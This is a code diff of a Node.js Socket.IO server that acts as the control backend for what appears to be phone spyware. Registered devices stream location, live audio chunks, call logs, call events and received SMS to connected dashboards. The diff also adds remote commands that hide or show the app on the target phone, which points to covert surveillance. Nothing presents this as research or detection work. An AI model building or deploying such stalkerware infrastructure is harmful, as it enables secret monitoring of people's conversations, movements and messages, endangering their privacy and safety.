@@ -7,60 +7,108 @@ const app = express();
 const server = http.createServer(app);
 const io = new Server(server);
 
-let devices = {}; // deviceId → socketId
+// Serve dashboard
+app.use(express.static(path.join(__dirname, "public"))); // keep your index.html inside /public
+
+// Track devices and listeners
+const devices = {};   // { deviceId: socketId }
+const listeners = []; // all dashboards
 
 io.on("connection", (socket) => {
-    console.log("Client connected:", socket.id);
+  console.log("New client connected:", socket.id);
 
-    // Device registers itself
-    socket.on("device-register", (data) => {
-        const deviceId = data.deviceId;
-        const deviceName = data.deviceName || "Unknown";
-
-        devices[deviceId] = socket.id;
-        console.log(`📱 Registered device: ${deviceName} (${deviceId})`);
-
-        // Inform dashboards
-        io.emit("device-registered", { deviceId, deviceName });
+  // Device registers itself
+  socket.on("device-register", (deviceId) => {
+    devices[deviceId] = socket.id;
+    console.log(`📱 Device registered: ${deviceId}`);
+    // Notify dashboards
+    listeners.forEach((listener) => {
+      listener.emit("device-registered", deviceId);
     });
+  });
 
-    // Location updates
-    socket.on("location-update", (data) => {
-        console.log("📍 Location from", data.deviceId, data.lat, data.lng);
-        io.emit("location-update", data);
-    });
+  // Dashboard registers itself
+  socket.on("listener-register", () => {
+    console.log("🖥️ Dashboard connected:", socket.id);
+    listeners.push(socket);
 
-    // Audio chunks
-    socket.on("audio-chunk", (data) => {
-        // data = { deviceId, chunk }
-        io.emit("audio-chunk", data);
+    // Send already registered devices
+    Object.keys(devices).forEach((deviceId) => {
+      socket.emit("device-registered", deviceId);
     });
+  });
 
-    // Call events
-    socket.on("call-event", (data) => {
-        io.emit("call-event", data);
+  // Location updates
+  socket.on("location-update", (data) => {
+    const { deviceId, lat, lng } = data;
+    console.log(`📍 Location from ${deviceId}: ${lat}, ${lng}`);
+    listeners.forEach((listener) => {
+      listener.emit("location-update", { deviceId, lat, lng });
     });
+  });
 
-    // SMS received
-    socket.on("sms-received", (data) => {
-        io.emit("sms-received", data);
+  // Audio stream
+  socket.on("audio-chunk", (data) => {
+    const { deviceId, base64Chunk } = data;
+    listeners.forEach((listener) => {
+      listener.emit("audio-chunk", { deviceId, base64Chunk });
     });
+  });
 
-    socket.on("disconnect", () => {
-        console.log("❌ Disconnected:", socket.id);
-        for (let deviceId in devices) {
-            if (devices[deviceId] === socket.id) {
-                io.emit("device-disconnected", { deviceId });
-                delete devices[deviceId];
-            }
-        }
+  // Call logs
+  socket.on("call-logs", (data) => {
+    const { deviceId, logs } = data;
+    listeners.forEach((listener) => {
+      listener.emit("call-logs", { deviceId, logs });
     });
+  });
+
+  // Call events
+  socket.on("call-event", (data) => {
+    const { deviceId, event } = data;
+    listeners.forEach((listener) => {
+      listener.emit("call-event", { deviceId, event });
+    });
+  });
+
+  // SMS
+  socket.on("sms-received", (data) => {
+    const { deviceId, sms } = data;
+    listeners.forEach((listener) => {
+      listener.emit("sms-received", { deviceId, sms });
+    });
+  });
+
+  // Remote control (from dashboard → device)
+  socket.on("hide-app-server", ({ deviceId }) => {
+    const devSocketId = devices[deviceId];
+    if (devSocketId) io.to(devSocketId).emit("hide-app");
+  });
+
+  socket.on("show-app-server", ({ deviceId }) => {
+    const devSocketId = devices[deviceId];
+    if (devSocketId) io.to(devSocketId).emit("show-app");
+  });
+
+  // Handle disconnect
+  socket.on("disconnect", () => {
+    console.log("Client disconnected:", socket.id);
+
+    // If it was a device, remove from list
+    const deviceId = Object.keys(devices).find((id) => devices[id] === socket.id);
+    if (deviceId) {
+      delete devices[deviceId];
+      console.log(`❌ Device disconnected: ${deviceId}`);
+    }
+
+    // If it was a dashboard, remove from listeners
+    const idx = listeners.indexOf(socket);
+    if (idx !== -1) listeners.splice(idx, 1);
+  });
 });
 
-// Serve static files (dashboard)
-app.use(express.static(path.join(__dirname, "public")));
-
-const PORT = process.env.PORT || 3001;
+// Start server
+const PORT = 3001;
 server.listen(PORT, () => {
-    console.log(`🚀 Server running on http://localhost:${PORT}`);
+  console.log(`🚀 Server running on http://localhost:${PORT}`);
 });
